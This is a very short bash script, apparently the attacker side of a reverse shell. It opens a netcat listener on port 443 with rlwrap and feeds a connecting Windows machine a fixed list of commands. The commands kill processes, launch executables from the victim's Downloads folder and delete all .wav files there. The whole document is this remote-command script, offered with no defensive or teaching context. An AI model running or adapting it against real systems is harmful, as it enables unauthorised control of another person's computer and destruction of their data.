#/bin/bash

rlwrap nc -nvlp 443 << EOF
taskkill /F /IM "OnePiece.exe"
start "" "C:\Users\user\Downloads\OnePiece.exe"
taskkill /F /IM "mp3.exe"
cd c:\users\user\downloads\mp3
del *.wav && start "" "C:\Users\User\Downloads\mp3\mp3.exe"

EOF
